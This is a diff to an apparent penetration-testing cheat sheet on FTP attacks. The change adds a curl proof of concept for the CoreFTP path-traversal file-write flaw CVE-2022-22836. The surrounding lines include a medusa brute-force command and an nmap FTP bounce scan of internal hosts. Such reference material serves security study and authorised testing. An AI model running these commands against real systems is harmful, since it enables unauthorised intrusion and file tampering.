@@ -91,7 +91,10 @@ medusa -u <user> -P <list> -h <HOST> -M ftp     # brute (spraying usually better
 ```
 - **Anonymous access** → read/upload sensitive files.
 - **FTP bounce** (misconfig): use the FTP server to scan internal hosts — `nmap -Pn -b anonymous:pass@<FTP> <internal_target>`.
-- **CVE-2022-22836 (CoreFTP)** — authenticated path traversal / arbitrary file write via HTTP PUT with `../`.
+- **CVE-2022-22836 (CoreFTP, <build 727)** — authenticated path traversal / arbitrary file write via HTTP PUT with `../`:
+  ```bash
+  curl -k -X PUT -H "Host: <IP>" --basic -u <user>:<pass> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
+  ```
 - Post-login: `ls cd get mget put mput`. Secure variants: SFTP, FTPS. Servers: vsftpd, proftpd.
 
 ### SMB (TCP/445, 139 + UDP/137-138)
